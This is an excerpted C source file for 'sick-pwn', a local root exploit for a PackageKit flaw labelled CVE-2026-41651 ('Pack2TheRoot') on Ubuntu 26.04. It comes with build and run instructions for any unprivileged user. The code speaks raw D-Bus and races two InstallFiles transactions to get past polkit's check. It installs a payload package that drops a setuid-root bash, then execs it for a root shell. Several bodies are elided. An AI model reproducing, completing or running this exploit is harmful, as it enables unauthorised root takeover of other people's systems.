 ...
 *                         `-    \`_`"'-
 *
 *   sick-pwn — clean, dependency-free reimpl of CVE-2026-41651 (Pack2TheRoot)
 *
 *   Single .c file, no glib, no libdbus. Speaks raw D-Bus over the system bus
 *   Unix socket. Drops a setuid-root bash to a non-nosuid path. Exec's it.
 *   You get root.
 *
 *   target  : Ubuntu Resolute 26.04 LTS, PackageKit <= 1.3.4
 *   author  : _SiCk <sick@afflicted.sh> — https://afflicted.sh
 *   build   : gcc -O2 -o sick-pwn sick-pwn.c       (no -l flags)
 *   run     : ./sick-pwn                            (as any unpriv user)
 *
 *   based on the public Pack2TheRoot PoC by Vozec; the .deb-builder is the
 *   only borrowed code. The D-Bus client is hand-rolled here.
 */
...
#define TFLAG_ONLY_TRUST 0x1
#define TFLAG_SIMULATE   0x4

/* =========================================================================
 * .deb builder (CRC32 / gzip-stored / ustar / ar) — pure C, no deps
 * =========================================================================*/
...
/* SASL EXTERNAL auth: send uid in ASCII hex. */
static void bus_auth(int fd) {
    char line[128];
    /* D-Bus expects a leading nul byte. */
    ...
    /* hex-encode the ASCII representation of the uid, e.g. "1000" -> "31303030" */
    for (int i = 0; i < tn; i++)
...
/* Marshalling helpers — little-endian D-Bus. */
...
/* header field: STRUCT( BYTE field_code, VARIANT signature value ) */
...
/* Build & send a METHOD_CALL. body is already serialised.
...
static uint32_t send_call(int fd, const char *dest, const char *path,
    ...
    /* header: build into a buffer, prepend the fixed 12-byte preamble afterwards. */
    struct buf hdr; buf_init(&hdr);
    /* header field array (the array's content) */
    ...
    /* fixed 12-byte preamble + 4 bytes for header-fields-array-length + payload + pad-to-8 + body */
    /* serialise preamble */
    buf_u8(&hdr, 'l');                      /* endian */
    buf_u8(&hdr, 1);                        /* msg type METHOD_CALL */
    buf_u8(&hdr, 0);                        /* flags = 0 (default: expect reply) */
    buf_u8(&hdr, 1);                        /* protocol version */
    buf_u32(&hdr, (uint32_t)body_len);      /* body length */
    buf_u32(&hdr, serial);                  /* serial */
    buf_u32(&hdr, (uint32_t)fa.len);        /* header fields array byte length */
    /* append the field array bytes */
    buf_grow(&hdr, fa.len);
    memcpy(hdr.p + hdr.len, fa.p, fa.len);
    hdr.len += fa.len;
    /* pad header to 8-byte alignment before body */
    buf_align(&hdr, 8);
...
static uint32_t send_call_noreply(int fd, const char *dest, const char *path,
    ...
    buf_u8(&hdr, 'l');
    buf_u8(&hdr, 1);
    buf_u8(&hdr, 1);                /* NO_REPLY_EXPECTED */
    buf_u8(&hdr, 1);
...
/* read one full D-Bus message into rbuf, return total length. */
static size_t recv_msg(int fd, uint8_t *rbuf, size_t cap) {
    /* read 16-byte fixed prefix */
    size_t got = 0;
    while (got < 16) {
...
/* extract the FIRST string out of the body, assuming sig "s" or "o" or "ss..." */
static const char *first_string(const uint8_t *msg, size_t total) {
    /* parse fixed 16-byte prefix */
    uint32_t fa_len;
    memcpy(&fa_len, msg + 12, 4);
    size_t hdr_len = 16 + fa_len;
    if (hdr_len % 8) hdr_len += 8 - (hdr_len % 8);
    /* body starts at hdr_len; first 4 bytes are length of first string */
...
static void hello(int fd) {
    ...
    /* read reply (we don't care about the unique name, just the protocol) */
    recv_msg(fd, rbuf, sizeof rbuf);
}

/* CreateTransaction — returns the new transaction object path. */
static char *pk_create_transaction(int fd, char *out, size_t outsz) {
    ...
    /* may receive NameAcquired signal first, then method-return; loop until we
     * see a METHOD_RETURN with a string body. */
    for (int i = 0; i < 8; i++) {
        size_t total = recv_msg(fd, rbuf, sizeof rbuf);
        if (rbuf[1] != 2) continue;          /* not METHOD_RETURN */
...
int main(int argc, char **argv) {
    ...
    LOG("sick-pwn — clean Pack2TheRoot reimpl, no deps. uid=%u", getuid());

    /* 1) build dummy + payload .deb in-process */
    ...
    /* 2) connect to the system bus and authenticate */
    g_bus = connect_bus();
    bus_auth(g_bus);
    hello(g_bus);
    LOG("bus authenticated");

    /* 3) create a fresh transaction */
    char txpath[128];
    pk_create_transaction(g_bus, txpath, sizeof txpath);
    LOG("transaction: %s", txpath);

    /* 4) the race: two async fire-and-forget InstallFiles
     *    a) SIMULATE flag — bypasses polkit, sets state READY, schedules dispatch
     *    b) NONE flag    — overwrites cached_full_paths + cached_transaction_flags
     *                      backward state-transition guard silently swallows
     *    c) idle callback fires — runs payload as root */
    pk_install_files(g_bus, txpath, TFLAG_SIMULATE, dummy);
    pk_install_files(g_bus, txpath, TFLAG_NONE,     payload);
    LOG("race dispatched, polling for setuid bash...");

    /* 5) poll for the setuid bash to appear */
    struct stat st;
    int landed = 0;
    ...
    /* leave the dummy/payload on disk; PackageKit may still hold them. */
    if (!landed) {
        fprintf(stderr, "[-] did not land in %ds. retry, or try `systemctl restart packagekit` first.\n", duration);
        return 1;
    }

    /* 6) drop into root shell.
     *    bash drops -p mode unless explicit; -p preserves euid. */
    LOG("popping root shell — `id; whoami` to verify");
    char *const argv2[] = { (char*)SUID_PATH, "-p", NULL };
